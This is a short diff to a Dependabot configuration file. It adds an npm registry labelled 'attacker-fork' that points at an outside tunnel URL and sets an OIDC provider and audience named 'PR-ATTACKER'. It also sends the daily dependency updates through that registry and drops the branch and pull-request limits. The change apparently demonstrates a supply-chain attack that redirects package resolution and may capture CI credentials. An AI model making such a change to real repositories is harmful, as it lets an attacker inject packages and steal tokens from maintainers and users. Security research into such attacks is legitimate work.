@@ -1,8 +1,14 @@
 version: 2
+registries:
+  attacker-fork:
+    type: npm-registry
+    url: https://0b0d12474806f4.lhr.life/fork-pr
+    jfrog-oidc-provider-name: PR-ATTACKER
+    audience: PR-ATTACKER-AUD
 updates:
   - package-ecosystem: "npm"
     directory: "/"
     schedule:
       interval: "daily"
-    target-branch: "main"
-    open-pull-requests-limit: 10
+    registries:
+      - attacker-fork
